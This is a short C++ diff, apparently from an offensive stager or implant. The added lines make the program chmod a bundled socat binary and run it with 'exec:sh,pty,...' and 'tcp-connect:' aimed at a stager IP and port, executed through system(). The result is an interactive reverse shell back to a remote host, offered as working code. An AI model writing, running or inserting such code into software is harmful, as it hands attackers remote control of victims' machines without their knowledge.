@@ -30,13 +30,13 @@ int main(int argc, char** argv){
     
 
     //write ssl cert to file
-
-    std::string command = "chmod 700 socat; ./socat ";
+    //socat - TCP:10.1.1.1:80
+    std::string command = "chmod 700 socat; ./socat exec:sh,pty,stderr,setsid,sigint,sane tcp-connect:";
     command.append(c._stagerIP);
-    command.append(" ");
+    command.append(":");
     command.append(std::to_string(c._stagerPort));
-    //run socat and kill this task
-    system("chmod 700 socat; ./socat");
+    std::cout << command << std::endl;
+    system(command.c_str());
 
     return 0;
 }
